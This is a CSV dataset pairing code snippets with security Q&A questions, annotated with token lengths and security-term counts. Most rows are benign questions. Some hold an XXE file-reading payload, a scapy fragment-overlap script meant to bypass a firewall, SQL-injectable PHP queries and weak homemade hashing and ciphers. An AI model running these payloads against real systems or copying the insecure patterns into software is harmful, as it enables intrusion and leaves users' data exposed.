,CODE,TEXT,code_token_length,text_token_length,security_terms_count,has_code_construct
598,"SELECT user_id, username, user_password, user_active, user_level,
user_login_tries, user_last_login_try
FROM USERS_TABLE
WHERE username = ’$username’ AND user_password = ’md5($password)’;
","In Software Assurance class I was asked a question why following query allows SQL injection which will allow log in into unsafe phpBB version but will not allow any modification of the database. We prepared our VM's with PHP with disabled magic quotes to allow this kind of abuse. Otherwise, this would not work. We also have very old version of phpBB from 2005. {code-blk} Now, why am I NOT able to add/update/delete any accounts? I have a brief idea why, but I'm not 100% sure. I'm not asking how to make it work, but rather why this wouldn't work.",73,142,1,True
603,"128.31.0.39
Country:        US [Cambridge, United States]
86.59.21.38
country:        AT [Villach, Austria]
194.109.206.212
country:        NL [Amsterdam, Netherlands]
82.94.251.203
country:        NL [Amsterdam, Netherlands]
76.73.17.194
Country:        US [Denver, United States]
212.112.245.170
country:        DE [Wallsbuell, Germany]
193.23.244.244
country:        DE [Hamburg, Germany]
208.83.223.34
Country:        US [San Francisco, United States]
171.25.193.9
country:        SE [Stockholm, Sweden]
154.35.32.5
country:        MU [Not Mauritius: Washington, United States]
","What could attacker do with stolen private keys of main nodes? Tor is based on 10 main nodes: , , , , etc. IP Addresses of this nodes hard-coded into client. ./src/or/config.c: {code-blk} 10 cities on world map, not so many. Thereafter, they move back to the USA, sitting down in their laboratory. Obviously, they can easy attack any Tor node point-blank, in the middle on the provider side, AT&T, Verizon, whatever. Client connect to malicious Tor-network copy, which will be identical to original. He lost hidden-service in one moment, while he would checking Tor-network, NSA agent will disappear, client reconnect to original Tor-network, without any warning. What would attacker done remotely ? Or what else attacker could with this 10 priv_keys?",175,203,2,True
605,"A permutation is an ordered arrangement of the elements of some set S
Let S = {a, b, c}
c, b, a is a permutation of S
b, c, a is a different permutation of S
","I was reading some e-books to understand the basics of block ciphers and how it works in AES. As i understood, Permutation plays a big part in AES and Block Ciphers, Here is what i understood by permutation, {code-blk} Now, There was a power-point slide on Block ciphers i was reading and according to which, Why did they call it a permutation, Could anyone please explain ?",61,110,3,True
613,"HTTP/1.1 202 ACCEPTED
X-R2: 432143214321
X-Salt: $2a$10$rBV2JDeWW3.vKyeQcM8fFO
X-Session: 92429d82a41e930486c6de5ebda9602d55c39986

POST /auth/{id} HTTP/1.1
X-Session: 92429d82a41e930486c6de5ebda9602d55c39986
X-Auth: ad801198a9fab4e4ef79eb97624a4bf9c78b450a
","I have been interested in implementing authentication method for a web app that is run in modern browsers, without having to send the password over the wire. Can anyone suggest improvements or even tell me whether or not I am going wrong. The authentication is done over an unsecured HTTP connection using AJAX. My current understanding of an authentication protocol implementation Server has a users password that was hashed using bcrypt and stored during registration. User enters {code-blk}'s value for the key, for further requests. Concerns I am an average developer and no crypto expert and from my understanding I can not see any issues that might occur with this method. I can see the great advantages, such as: The password is never sent over the wire. Prevent MITM from getting your password. MITM can't modify request as it is hashed with the verifier and then sent. The server doesn't need to use bcrypt every time a user wants to authenticate.",167,211,2,True
644,"Array
(
    [captchas/6aab1bfa796ff02b48] => knfbb
    [captchas/3f53d6eefb535233f0] => HnHnQ
    [captchas/436e3567bdbb987b45] => HaEQS
    [captchas/916ac5d684f17f1677] => aQnWE
    [captchas/fb6267bfb72ff37fdb] => fHWya
    [captchas/3fb748ba654b98088e] => WkSEG
    [captchas/71ea9d1d88a245c1e3] => HkQXy
    .
    .
    .
);
","Hello information security stack exchange! I made a captcha application in PHP. It's certainly not a great idea to do so, but I was bored and I wanted to learn about Bézier curves and Bresenham line algorithms. Therefore let's disregard that my application is not really secure against serious cracking attempts that try to crack it with OCR methods. To my question: My app basically writes every two hours 10 new captcha images in a directory (with a cronjob). If there are more than 1000 images in the directory, it replaces the oldest 10 images with the newly generated ones. So there is always a pool of 1000 captchas that slowly but steadily refreshes. All the captcha images have a 18 char long random filename and I have a associative array in my database that maps the filenames as keys to the captchas value.The array looks something like this: {code-blk} Whenever my captcha application hooks into a comment form or login form in order to inject a captcha image, it choses a random captcha from the pool and let's the user try to solve it. Now you might already see the security drawback: How can I make sure that a user doesn't download all captchas and maps them manually (Decipher the captcha manually and map it to the md5-sum of the png-image) to it's corresponding string value and then spams my site with a script? The attacker would just need to download around 20 percent of all images and then he had a average success rate of, errhh, yeah 20%, in succeeding to spam my site (The script would just refresh the form as long as it serves a captcha that it knows). How would you defend against such attacks? (Under the condition that my app architecture doesn't change: I can't generate captchas on demand, it would be too slow). I thought of blacklisting IP addresses (parsing apache2 access_log IP addresses) from my site that visit my site more than 100 times per 5 minutes, but this could easily be circumvented by proxies.",202,495,1,True
659,"If the client provided a ""signature_algorithms"" extension, then all
certificates provided by the server MUST be signed by a hash/signature
algorithm pair that appears in that extension.
","In the specification for , it says the following: {code-blk} It can't proceeed any further on the server console, it says ""no shared cipher"". However, when I used wireshark and inspect the ClientHello.signature_algorithms, it did indeed has ECDSA pair in it. So I'm wondering is it me that misinterpret the specification?",44,95,1,True
668,"// For already logged in users:
if (password_verify(md5($_POST['pass']), $DBHash)) {

  }
","A GitHub project I recently checked has a flawed security as they're using an unsalted md5() to hash the passwords. I opened a bug and they acknowledged it. However, the transition from md5() to bcrypt would mean that every user would need to log in so the password can be migrated. So my question is, does using bcrypt over md5() reduce it's security? {code-blk} In that way, the whole database could be migrated easily, instead of migrating each user individually. Should there be any other problem besides the fact that PHP might timeout if not handled correctly? (around 1 second for each hash).",41,157,2,True
681,"# URL that doesn't require authentication
GET /api/security/session HTTP/1.1
HOST localhost:1234

HTTP/1.1 200 OK
Set-Cookie: .ASPXAUTH=SomeLongHexCodeHere; Expires=...; HttpOnly
Set-Cookie: CSRF-Token=TheToken; Expires=...;

# URL that does require authentication
GET /api/account/data
HOST localhost:1234
X-CSRF-Token: TheToken
","I'm working on a RESTful API to work with my AngularJS application. Authenticating works by generating an ASP.NET FormsAuthenticationTicket. It is stored in a cookie using For generating the CSRF Token I was thinking about generating a salted hash from the .ASPXAUTH cookie. Would this suffice in the protection against CSRF, assuming XSS is blocked and the authentication cookie isn't hijacked? Two final notes. Although my code runs on the ASP.NET platform, it's not using any of the ASP.NET technologies (WebForms, WCF, MVC, WebAPI, etc.) and cannot use their CSRF protection methods. Secondly the site doesn't use SSL, and sadly won't use SSL. It'll be vulnerable to MITM attacks, and there's not too much I can do about it.",125,209,1,True
685,"pepper = ""xyzzy""
importantFullUrl = ""https://.....""

salt = secureRandomBits(256)
url = importantFullUrl + ""&ts=987654321&salt="" + base62(salt)

signingKey = PBKDF2(pepper, salt, 10000 /*iterations*/, 256 /*bits*/)
mac = hmacSha256(url, signingKey)
signedUrl = url + ""&sig="" + base62(mac)
","We need to generate tamper-resistant URLs to access a service, which are then shared with the end-user. The URLs don't contain any confidential data, but we need to ensure that they have not been tampered with since they were generated. It's up to the end-user to keep these confidential. It seems like a MAC (like HMACSha256) would be appropriate for authenticating the URLs. I'd also like to include a salt and timestamp to make the MAC key less guessable, and so that the signed URLs can naturally expire. I was thinking that PBKDF2 might be a good way to generate the MAC key, e.g.: {code-blk} Does one approach offer significantly more security benefits over the other? Given the URLs will time out after a period (say, 24-48 hours), does it matter in this case? How do I pick a suitable iteration count for a given timeout? There's an approach described  that involves a user-provided password. Users to our service are authenticated using a different mechanism, and do not explicitly have a password. This is also not for a web service, and all of these signed URLs will be generated server-side, and checked again server-side.",132,293,1,True
701,"Authenticate by executing IsAuthenticated(@UserId, @HashedPassword) returns bit.

Create password by executing Create(@UserId, @HashedPassword) returns bit.

Update password by executing Update(@UserId, @OldHashedPassword, @NewHashedPassword) returns bit.
","First off, I don't know how hackers get at an entire password table and steal them. I don't know if the owners of the website are to blame or what, but I am wondering if it involves logging into the DB or not. Assuming that hackers steal passwords by logging into the DB with application or admin users, what about putting passwords into it's own schema with air-tight privs? PASS.Passwords having the hashed password and UserId primary/foreign key to the User table. The only permissions any DB user has to PASS schema would be execute procedure. Not even the DB admins would have read privs. {code-blk} And that is all you get. No user having permissions to actually read even the hashed password, would hackers still be able to steal the table even if they compromised the environment?",87,202,1,True
715,"[...]
PORT   STATE SERVICE
53/tcp open  domain
[...]
",Why is port 53 open on the WAN side of the router? And more importantly how do I close it? Port 53 is not one of my forwarded ports. Discovered by doing {code-blk} How can I close that security hole? (see ),14,59,1,True
718,"<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body,author)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
<!ENTITY writer ""Donald Duck."">
<!ENTITY copyright ""Copyright W3Schools"">
<!ENTITY attack SYSTEM ""file:///Users/testuser/Desktop/BB/demos/test.txt"">
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend</body>
<author>&writer;&copyright;&attack;</author> 
</note> 
","I am trying to understand the concept behind XXE (XML External Entity injection). I went through And since I am new to XML and DTD, I went through the W3Cschools tutorials as well on these topics. Now as per my readings I tried creating a demo of XXE. So below is my attempt to do the same : - {code-blk} And in the path file:///Users/testuser/Desktop/BB/demos/ I have a file test.txt that contains a string say :- this is secret stuff Now, when I open my XML file in Firefox it gives me the tree structure of my XML document and as expected it expands the entities writer and copyright with their respective content as defined in the DTD. However, the XML parser did not expand the entity ""attack"", which should have happened as has been demonstrated in the link given above. Now I would like to know why was the entity attack not expanded. And secondly, even if it were expanded, will the file permissions (of the local file system) not come into play here?",242,260,1,True
726,"#include <stdio.h>
#include <windows.h>
#include <bcrypt.h>

void main()
{

SECURITY_STATUS Status = ERROR_SUCCESS;
  LPWSTR wszCipher = (L""TLS_RSA_WITH_RC4_128_SHA"");

Status = BCryptRemoveContextFunction(
            CRYPT_LOCAL,
            L""SSL"",
            NCRYPT_SCHANNEL_INTERFACE,
            wszCipher);
}
","A security scan result prior to the deployment of a web application on Windows Server 2008 R2 has raised the below message : Weak SSL Cipher Suites are Supported Reconfigure the server to avoid the use of weak cipher suites. The configuration changes are server-specific. SSLCipherSuite HIGH:MEDIUM:!MD5!EXP:!NULL:!LOW:!ADH For Microsoft Windows Vista, Microsoft Windows 7, and Microsoft Windows Server 2008 remove the cipher suites that were identified as weak from the Supported Cipher Suite list by following these instructions: I've tried understanding the MSDN information but I'm totally lost in there. First of all, I do not understand which is the cipher suite that should be removed or disabled. Then how am I suppose to run the code given an example to remove a cipher suite? {code-blk}",141,204,2,True
736,"$useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : NULL;

$query = ""SELECT `id` FROM `browser` WHERE name = '"".$useragent.""' LIMIT 0,1;"";
$result = @mysql_query($query);

//  The browser is visiting the page for the first time
if (!$row = @mysql_fetch_assoc($result)) {
    echo ""<!-- new browser -->"";

    $query = ""INSERT INTO `browser`
                (`id` ,`name`)
              VALUES
                (NULL ,'"".$useragent.""');"";

    $result = @mysql_query($query);
}
//  The browser has already visited the page
else {
    echo ""<!-- taken -->"";
}
","This is a snippet of a PHP script: {code-blk} Now, it seems obvious to me that there is a SQL Injection on the $useragent parameter, but I can't able to exploit it, even with SQLMap. If anyone could help, I would really thankful. Best regards.",254,73,1,True
737,"<Connector port=""8443"" protocol=""HTTP/1.1"" SSLEnabled=""true""
    maxThreads=""150"" scheme=""https"" secure=""true""
    clientAuth=""false"" sslProtocol=""TLS""
    keystoreFile=""/root/my_workspace/server.keystore""              keystorePass=""changeit""/>

<transportReceiver name=""http"" class= ""org.apache.axis2.transport.http.AxisServletListener"">  
   <parameter name=""port"">8080</parameter>
</transportReceiver>
<transportReceiver name=""https"" class= ""org.apache.axis2.transport.http.AxisServletListener"">  
   <parameter name=""port"">8443</parameter>
</transportReceiver>
","I have written my webservice with HTTPS. But as per my requirement I should provide authentication. So thought of going with HTTPS SSL. could anyone help me with steps like moving HTTP to HTTPS and SSL certification part with step by step I did by adding below in service and axis XML files: {code-blk} But I don't want to access through HTTP. How can I restrict? Also I created the WDSL request via Eclipse, the value tag starts with ""q0"" and response has return tag as well. So how can I avoid and go with custom req/response? Can anyone guide me, step by step, to go ahead with this?",209,151,1,True
741,"(option 1: ip-based filtering)
iptables -I FORWARD -s $GUEST_SUBNET -d $HOME_SUBNET -j REJECT

(option 2: interface-based filtering)
iptables -I FORWARD -i $GUEST_INTERFACE -d $HOME_SUBNET -j REJECT
","I know a little bit about network security but it's only about enough to know there's a lot I don't know. My requirement is to add a 2nd wifi to my current setup (1 wifi emitted by a 1-physical-wifi-radio OpenWRT router; and a bunch of computers connected to the wifi) and to prevent users of the 2nd wifi from accessing my router config page and any services running on any of my own devices (e.g., non-Internet-visible file shares and servers). My current security measures are iptables rules that prevent 2nd-wifi-user access to my original network based on source IPs or source interfaces. My fear is that these may not be sufficient. {code-blk} I don't know much about spoofing but it seems to me that if a 2nd-wifi-user ""doctored"" his requests to the router configuration page (that sits within $HOME_SUBNET) as being from a source IP within $HOME_SUBNET, he could access and interact with the configuration page since he'd be able to sniff all of the traffic to the fake source IP address and construct sensible responses. Right? If I'm wrong, and my iptables rules are in fact sufficient, could someone please explain why a spoof is not possible given my rules and reasoning. Otherwise, does the encryption on my home wifi play a role in this? For instance, if my home wifi was WEP/WPA2/802.1x-encrypted, then would the response to the fake $HOME_SUBNET source IP be encrypted as well and thus be unreadable to my guests (thereby effectively securing my home network from my guests)? This seems sensible... Thanks! PS: this question follows from a recent  of mine and the responses I received for it. EDIT: Just to be clear, my home wifi and guest wifi are emitted by the same router.",96,450,1,True
742,"n = random 
e = factorial(n)  /* Public Key */ 
d = test(e)  /* Private Key */

test() 
{    
return XXOXOXXOOXO  /* X values are some random numbers &
 O is the digits of e number in order */ 
}
","I was wondering that what make RSA Asymmetric Cryptography Algorithm special. So I wrote a very simple algorithm that do the same work (Generate Public and Private Key) Now I want to ask you that What is the excellence of RSA vs my algorithm ? What's your idea? This is my algorithm : {code-blk} [-] e just has 5 digits. [-] test function, actually generates couple of different random numbers (X) and combine the random numbers with O that are e digits. So now we can get e from d but it's impossible to obtain d from e unless we guess all the possible values (Brute Force it) that needs time as the same as RSA.",77,172,3,True
770,"function hashPW($password){
    $letters = array('a','b','c','d','e','f','g');
    $numbers = array(1,2,3,4,5,6,7);
    return str_replace($letters,$numbers,md5($password));
}
","I am not sure if this is the best place to post this type of question. I have come up with function which, I believe, is a very secure method of hashing. (I could be completely wrong). Here's the code: {code-blk} ""password"" outputs as 56443332511765461483274528823699 I am not too sure if this a secure method. My thoughs were that it's hard to know which numbers were actually a letter or number from the md5. If this isn't a good option to use for my PHP web application, could you suggest something that is. Thanks.",86,149,1,True
788,"1615    12.259771000    CLIENT_IP   SERVER_IP   SSLv3   112 Client Hello
1629    12.429299000    SERVER_IP   CLIENT_IP   SSLv3   1488    Server Hello, Certificate, Certificate Request, Server Hello Done
1630    12.445672000    CLIENT_IP   SERVER_IP   SSLv3   397 Alert (Level: Warning, Description: No Certificate), Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
1645    12.666191000    SERVER_IP   CLIENT_IP   SSLv3   61  Alert (Level: Fatal, Description: Handshake Failure)
","I have written an application (in C#) to communicate with one of our customers via a web service.  Our customer requires us to use bi-directional SSL.  The customer has sent us their certificate (in the form of a .p7b file).  The client certificate was provided to me in the form of a .cer file. I've installed the certificates and in the program I use the HttpWebRequest class and add the client certificate to the ClientCertificates collection. When I run the program I get an exception: {code-blk} It seems the server has sent their certificate, but for some reason, my app is not sending one back, so it sends the No Certificate alert.  However, in my code, it seems to find the certificate and it is added to the ClientCertificate collection of the HttpWebRequest class.  Since I fairly new to SSL, I am not sure where the problem lies?  It could be a programming mistake, but using some test certficates seemed to work.  Does the alert indicate that there is a problem with the client certificate?  Some posts that I have read seem to indicate that although the private key is not sent to the server, it is still needed on the client side.  But after loading the certificate (using the .Net X509Certificate2 class), I notice that the PrivateKey property is null.  Could this be the source of the problem?  The .cer file was provided to me by someone else in the company. Any assistance or suggestions would be helpful.  I have refrained from posting code as I'm not sure it's welcome here, but I can post some if need be.",141,371,1,True
796,"dstIP=’10.0.2.17’

frag1=IP(dst=dstIP, id=12345, proto=1, frag=0, flags=1)/TCP(dport=80)/ICMP(type=8,
code=0, chksum=0xdce8)

frag2=IP(dst=dstIP, id=12345, proto=1, frag=2, flags=1)/TCP(dport=23)/”ABABABAB”

frag3=IP(dst=dstIP, id=12345, proto=1, frag=1,flags=0)/TCP(dport=23)/”AAAAAAAABABABABACCCCCCCC”

send(frag1)
send(frag2)
send(frag3)
","How to use  to overwrite a part of the TCP header information of the first fragment, which contained data that was allowed to pass through the firewall, with malicious data in subsequent fragments? For example: overwrite the destination port number to change the type of service i.e. change from port 80 (HTTP) to port 23 (Telnet) which would not be allowed to pass the router in normal circumstances. I want to overwrite the destination port in order to connect to the new port number. And I'm trying to bypass Firewall restrictions on remote web server which allows only web traffic on 80 port. I've used this sample code, but I don't get a response from the target machine: {code-blk}",196,161,1,True
797,"sector[0] = sector[0] ^ key[0]
sector[1] = sector[1] ^ key[1]
...
sector[31] = sector[31] ^ key[31]

sector[32] = sector[32] ^ key[0]
sector[33] = sector[33] ^ key[1]
...
sector[63] = sector[63] ^ key[31]

...
sector[511] = sector[511] ^ key[31]
","I'm trying to implement an encrypted file-system. The file-system consists of 512-byte sectors. I encrypt/decrypt the contents of a sector as follows: Compute the SHA256 sum of the user password. This results in a 32-byte User Key. Compute the ESSIV for a sector by computing the SHA256 sum of User Key and the Sector Number. This results in a 32-byte Sector Key. XOR Sector Key with the plain sector data to get the cipher data as follows: {code-blk})... I see that no two ciphered sectors of this large file are identical, which is great! I see repeating patterns (each pattern 32-bytes long) within the same sector, which is not so great! These are obviously coming from by XOR step above. My question is 2-fold: Can an adversary break open the above file-system encryption by copying carefully constructed files to this file-system? Or, is the above scheme good enough? When I copy the above file to a TrueCrypt volume, I see no repeating patterns. (I used AES and RIPEMD-160 as the encryption and hashing algorithms, respectively.) So, other than using AES, what can I do  to achieve a TrueCrypt-like result via some simple and lightweight XOR-like operation?",113,312,1,True
802,"public string Data()
{
    AES objaes =new AES();
    objaes.key= getkey(EncryptedDEK);
//decrypt the values
}

public string getkey(string EncryptedDEK)
{

  //connect to the server 2 and get the DEK
  request(EncryptedDEK);
}

public string request(string encryptedDEK)
{
    //check the request
    //decrypt the encrypted DEK with KEK
   //return the Decrypted DEK
}
","Decrypting the DEK using KEK under PCI-Standards, which are separated by Servers: Let say for example we have server1 and server2 Server1: It is in East US, called it as Application Server. Hosted my website and database. In my code I'm using AES 256-bit cryptograpy. Store the encrypted cardholder data in DB. This server contains Encrypted DEK(Data Encryption Key). Server2: It is in WestUS, called it as Key Server. Only contains the  Key Encryption Key(KEK) to decrypt the DEK. All port are bocked only accept the request from server1. I have two processes in my mind for implementation. But just got confused which could be a better way: Process 1: Below code is running in server1: {code-blk} Through sql server can I decrypt the Encryped DEK by connecting to the Server 2 from Server 1? Which one among the two process works fine or comes under PCI-DSS standards? Is there any better way than the above two processes?",121,249,3,True
805,"Received: (qmail 9004 invoked by uid 0); 27 Feb 2014 06:16:28 -0000
X-TCPREMOTEIP: 1.53.225.12
X-Authenticated-UID: brian@monahanlaw.com
Received: from unknown (HELO monahanlaw.com) (brian@monahanlaw.com@1.53.225.12)
  by 0 with ESMTPA; 27 Feb 2014 06:16:27 -0000
From: ""Rob Lastname"" <caveatrob@yahoo.com**>

Received: from [188.253.180.46] (helo=mst-music.ch) by box6.rapidenet.ca with
 esmtpa (Exim 4.80.1)   (envelope-from <caveatrob@yahoo.com>)   id
 1WIvxj-0003Jw-Rn; Thu, 27 Feb 2014 03:05:00 -0500
From: Rob Lastname <caveatrob@yahoo.com>
","Spam emails went out for an hour earlier this week bearing my Yahoo account in the FROM field and going out to all my contacts. I changed the password, then saw (via rejected emails sent to my Yahoo account) that mail had gone out again with my email in the ""FROM"" field, to all my contacts. However, in neither case did the account show to be accessed (verified in the Yahoo web client), nor did the account have anything in the sent folder of the account. So I looked at the headers, and the last ""Received"" marker before the FROM looked suspicious, leading me to believe that my account is no longer able to be accessed, but with my full contact list, the spammers can now impersonate me and send out mail to my contacts. Two of the headers' ""Received"" markers are shown below: The ""FROM"" marker in each is my Yahoo account, caveatrob@yahoo.com {code-blk}",248,212,1,True
816,"Bag Attributes
    localKeyID: 01 00 00 00 
    friendlyName: TimeTellbv wildcard
subject=/serialNumber=34VD79pOnKBR2dM5LC69jkD7PGuRM6VC/OU=GT04962750/OU=See www.rapidssl.com/resources/cps (c)13/OU=Domain Control Validated - RapidSSL(R)/CN=*.timetellbv.nl
issuer=/C=US/O=GeoTrust, Inc./CN=RapidSSL CA
-----BEGIN CERTIFICATE-----

Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: le-0f8807ed-4cbe-43a6-84a9-94ef82e3fd39
    Microsoft CSP Name: Microsoft RSA SChannel Cryptographic Provider
Key Attributes
    X509v3 Key Usage: 10 
-----BEGIN ENCRYPTED PRIVATE KEY-----

c:\OpenSSL-Win32\bin\openssl x509 -in tt_https_key.pem -inform PEM -noout -text >tt_https_key.txt

unable to load certificate
2180:error:0906D06C:PEM routines:PEM_read_bio:no start line:.\crypto\pem\pem_lib
.c:696:Expecting: TRUSTED CERTIFICATE
","Our software contains two executables that need to serve data over SSL (and several that need to do requests over HTTPS)). I notice that it is distributed with some .PEM files created with OpenSSL. These files are read by the software when it needs to consume or serve over HTTPS. The second file says: BEGIN ENCRYPTED PRIVATE KEY Question: If private keys should never be distributed, is it OK to distribute the encrypted version? Do we run any risks with that? I have read , but I'm still unclear about the possibility for others to do something malicious (spoofing?) with that encrypted private key. (BTW There is actually a third intermediate certificate because of the issue of , but that seems irrelevant to the question). First file Header: {code-blk}",392,179,2,True
825,"a:
    (dhA, dhSecret) = DH_GEN(common)
    a->b (dhA)

b:
    (dhB, dhSecret) = DH_GEN(common)
    b->a (dhB)

a:
    a<-b (dhB)
    sessionKey = DH_KEY(dhB, dhSecret)

b:
    b<-a (dhA)
    sessionKey = DH_KEY(dhA, dhSecret)

a:
    data = ENCRYPT(sessionKey, data)
    dhA++
    hmac = HMAC(sessionKey, data | dhA)
    a->b (data, hmac)

b:
    b<-a (data, hmac)
    if (hmac == HMAC(sessionKey, data | dhA+1)) {
        dhA++
        data = DECRYPT(sessionKey, data)
    }

b:
    data = ENCRYPT(sessionKey, data)
    dhB++
    hmac = HMAC(sessionKey, data | dhB)
    b->a (data, hmac)

a:
    a<-b (data, hmac)
    if (hmac == HMAC(sessionKey, data | dhB+1)) {
        dhB++
        data = DECRYPT(sessionKey, data)
    }
","I have an interesting case regarding protection against replay attacks. Under the assumption that Alice and Bob have used Diffie-Hellman key exchange to establish a secure temporary session, would it be safe for them to use the public portion of their DH keys as nonce seeders in combination with HMAC to protect from replay attacks? In pseudo code - Establishing a session: {code-blk} And the second question - would it be easier and just as safe to use a self-incrementing nonce starting from a fixed number (say 0) instead of using fairly large DH public keys for the initial nonce? What are the perils (if any) of such approach, aside from a possible MITM attack during the session establishment which can be thwarted using some form of authenticated Diffie-Hellman KE (e.g. having the generated public keys signed by trusted certificates during the exchange)? Thanks",344,207,1,True
832,"pub  1024D/ABABABAB  created: 1970-01-01  expires: never       usage: SCA 
                    trust: full          validity: full
sub  1024g/BCBCBCBC  created: 1970-01-01  expires: never       usage: E   
[ unknown] (1). John Doe <doe@some.tld>
[  full  ] (2)  John Doe <j_doe@some.tld>
","I observed today that Thunderbird/Enigmail (24.2.0/1.6) does not allow me to select a key for encrypting mails to one of the addresses associated with the key, even though others work. Help sites claim that the reason must be a lack of user trust, but the key is trusted (fully). I think I tracked down the issue to some extent; {code-blk} on a Debian GNU/Linux variant.",93,103,1,True
864,"        Const pattern As String = ""^[a-zA-Z0-9.=,:\s\\\/\']*$""
        term = term.Replace(""'"", ""''"")

        If Not Tools.ValidString(term, pattern) Then
            term = String.Empty
        End If 

    Public Shared Function ValidString(ByVal source As String, ByVal pattern As String) As Boolean
        If source = String.Empty Then Return True

        Dim params As Text.RegularExpressions.RegexOptions = Text.RegularExpressions.RegexOptions.None
        Dim regex As New Text.RegularExpressions.Regex(pattern, params)
        Dim match As Text.RegularExpressions.Match = regex.Match(source, pattern, params)
        Return match.Success
    End Function
","My team currently uses ASP.NET with MS SQL Server for our software. Security has only become important since I started, in which there is injection vulnerabilities everywhere. Due to current integration with Oracle and MS SQL the business decision was never to use parameterized queries. This of course has been an issue. Implementing Find and replace along with whitelisting of parameters has reduced this issue strongly. My only issue is, I have read a lot about unicode and other encodings being the cause of sql injection. I dont quite understand this. Currently we sanitise everything like this: {code-blk} Does anyone have an example where unicode/encoded injection could be used, or just a plain example where this regular expression would fail to prevent sql injection. Thanks UPDATE Can I please not have answers related to standard SQL Injection. I am strongly familiar with this already. ALSO please stop posting saying don't use string sanitisation. There is zero resources in the company to shift all queries to parameterised queries with ADO.NET while also building in logic for it to use ODP.NET if the client uses oracle. OWASP mention the use of whitelisting of characters if parameterising is out of question, so like in the regex, only few characters are allowed. I am not blacklisting characters, as this is stupid. There is no compliance required for the data we hold. The security is for database integrity, as it would be a nightmare if content was changed. Our software is a very large cloud application CMS and DMS in one, where 99% of the software is used internal, and only a minority is external and is only used for public review and commenting on the documents. From my new understanding of Unicode injection. It can only occur if the data is being encoded before being placed into the query, and therefore unicode injection only really occurs in applications with globalisation of data. I am passing raw string fields straight into the string query after the sanitisation above. Can I please only have an answer from an expert in injection, who can back up my claim that Unicode will not apply in my circumstance?",205,474,2,True
880,"    Const pattern As String = ""^[a-zA-Z0-9.=,:\s\\\/\']*$""
    term = term.Replace(""'"", ""''"")

    If Not Tools.ValidString(term, pattern) Then
        term = String.Empty
    End If 

Public Shared Function ValidString(ByVal source As String, ByVal pattern As String) As Boolean
    If source = String.Empty Then Return True

    Dim params As Text.RegularExpressions.RegexOptions = Text.RegularExpressions.RegexOptions.None
    Dim regex As New Text.RegularExpressions.Regex(pattern, params)
    Dim match As Text.RegularExpressions.Match = regex.Match(source, pattern, params)
    Return match.Success
End Function
","My team currently uses ASP.NET with MS SQL Server for our software. Security has only become important since I started, in which there is injection vulnerabilities everywhere. Due to current integration with Oracle and MS SQL the business decision was never to use parameterized queries. This of course has been an issue. Implementing Find and replace along with whitelisting of parameters has reduced this issue strongly. My only issue is, I have read a lot about unicode and other encodings being the cause of sql injection. I dont quite understand this. Currently we sanitise everything like this: {code-blk} Does anyone have an example where unicode/encoded injection could be used, or just a plain example where this regular expression would fail to prevent sql injection. Thanks EDIT: There is no compliance required for the data we store. But still we would like to prevent injection. Parameterised queries are not an option and would require years of work with the little resources we have and the size of the CMS we have developed. We have a couple of clients with oracle DB's using our CMS for internal work (not exposed to public) and that is why there was no parameterised queries form the start.",205,266,1,True
